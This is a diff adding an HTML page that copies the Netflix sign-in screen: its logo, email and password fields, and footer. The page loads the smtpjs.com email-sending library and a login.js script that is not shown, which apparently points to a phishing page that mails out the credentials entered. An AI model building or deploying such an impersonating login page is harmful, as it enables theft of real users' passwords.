@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix</title>
+    <link rel="stylesheet" href="signdesign.css">
+</head>
+<body>
+    <div id="container">
+        <header>
+            <a href="./index.html" target="_self"><img src="./Netflix_logo_PNG1.png"></a>
+        </header>
+        <main>
+            <div class="content">
+            <form id="form" action="">
+                <h3>Sign In</h3>
+                <div class="email">
+                    <input id="em" type="email" autocomplete="off" required>
+                    <label id="e">Email or mobile number</label>
+                </div>
+                <div class="password">
+                    <input id="ps" type="password" autocomplete="off" required>
+                    <label id="p">Password</label>
+                </div>
+                <button id="sign-in" type="submit">Sign In</button>
+                <p>OR</p>
+                <button id="code" type="submit">Use a sign-in code</button>
+                <a href="" target=""><p>Forgot password?</p></a>
+            </form>
+            <p>
+                <label>
+                    <input type="checkbox" > Remember me.
+                </label>
+            </p>
+            <div class="nn" style="display: flex;"><p>New to Netflix?</p><a href="./index.html" target="_self">Sign up now.</a></div>
+            <div class="ll"><p>This page is protected by Google reCAPTCHA to<br> ensure you're not a bot.</p><a href="" target="">Learn more.</a></div>
+            </div>
+        </main>
+        <footer>
+            <p>Quesitons?Call 000-800-919-1694</p>
+            <div class="ff">
+                <p>FAQ</p>
+                <p>Help Center</p>
+                <p>Terms of Use</p>
+                <p>Privacy</p>
+                <p>Cookie Preferences</p>
+                <p>Corporate Information</p>
+            </div>
+            <select>
+                <option>English</option>
+                <option>हिंदी</option>
+            </select>
+        </footer>
+        <script src="https://smtpjs.com/v3/smtp.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+        <script src="login.js"></script>
+    </div>    
+</body>
+</html>
